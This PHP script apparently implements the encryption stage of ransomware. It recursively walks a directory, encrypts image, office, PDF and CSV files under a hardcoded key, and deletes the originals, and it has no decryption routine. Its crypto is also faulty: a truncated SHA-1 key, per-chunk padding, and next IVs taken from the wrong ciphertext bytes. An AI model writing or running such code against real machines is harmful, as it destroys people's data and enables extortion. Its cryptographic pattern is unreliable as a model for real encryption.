<?php
/**
 * Define the number of blocks that should be read from the source file for each chunk.
 * For 'AES-128-CBC' each block consists of 16 bytes.
 * So if we read 10,000 blocks, we load 160kb into memory. You may adjust this value
 * to read/write shorter or longer chunks.
 */
define('FILE_ENCRYPTION_BLOCKS', 10000);

/**
 * Encrypts the passed file and saves the result in a new file with ".enc" as suffix.
 *
 * @param string $source Path to the file that should be encrypted
 * @param string $key    The key used for encryption
 * @return string|false  Returns the file name that has been created or FALSE if an error occurred
 */
function encryptFile($source, $key)
{
    $key = substr(sha1($key, true), 0, 16);
    $iv = openssl_random_pseudo_bytes(16);

    $dest = $source . '.enc';

    $error = false;
    if ($fpOut = fopen($dest, 'w')) {
        // Put the initialization vector at the beginning of the file
        fwrite($fpOut, $iv);
        if ($fpIn = fopen($source, 'rb')) {
            while (!feof($fpIn)) {
                $plaintext = fread($fpIn, 16 * FILE_ENCRYPTION_BLOCKS);
                $ciphertext = openssl_encrypt($plaintext, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
                // Use the first 16 bytes of the ciphertext as the next initialization vector
                $iv = substr($ciphertext, 0, 16);
                fwrite($fpOut, $ciphertext);
            }
            fclose($fpIn);
        } else {
            $error = true;
        }
        fclose($fpOut);
    } else {
        $error = true;
    }

    if (!$error) {
        unlink($source);
        return $dest;
    } else {
        unlink($dest);
        return false;
    }
}

/**
 * Encrypt files in a directory and its subdirectories.
 *
 * @param string $directory Path of the directory
 * @param string $key       Encryption key
 */
function encryptFilesInDirectory($directory, $key)
{
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST,
        RecursiveIteratorIterator::CATCH_GET_CHILD // Ignore "Permission denied" errors
    );

    $allowedImageTypes = ['jpg', 'jpeg', 'png', 'gif', 'xls', 'xlsx', 'doc', 'docx', 'pdf', 'csv']; // file extensions

    foreach ($iterator as $path => $fileInfo) {
        if ($fileInfo->isFile()) {
            $extension = strtolower(pathinfo($path, PATHINFO_EXTENSION));
            if (in_array($extension, $allowedImageTypes)){
                $source = $path;

                // Encrypt the file and delete the original file
                encryptFile($source, $key);

                echo "File encrypted and original file deleted: $source\n";
                echo "<br>";
            }

        }
    }
}

$directory = 'C:/xampp/htdocs/ed/sample';
$key = 'my-secret-key';

encryptFilesInDirectory($directory, $key);

echo "Files encrypted and original files deleted!\n";
